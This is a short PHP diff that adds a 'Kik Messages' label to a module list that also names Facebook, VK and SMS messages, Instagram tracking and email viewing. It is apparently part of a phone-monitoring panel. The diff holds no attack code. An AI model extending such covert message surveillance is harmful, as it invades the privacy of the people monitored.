@@ -54,6 +54,7 @@ $default = array(
         Modules::FACEBOOK => 'Facebook Messages',
         Modules::VK => 'VK Messages',
         Modules::INSTAGRAM => 'Instagram Tracking',
+        Modules::KIK => 'Kik Messages',
         Modules::EMAILS => 'View Emails',
         Modules::APPLICATIONS => 'View Applications',
         Modules::SMS_COMMANDS => 'Sms Commands',
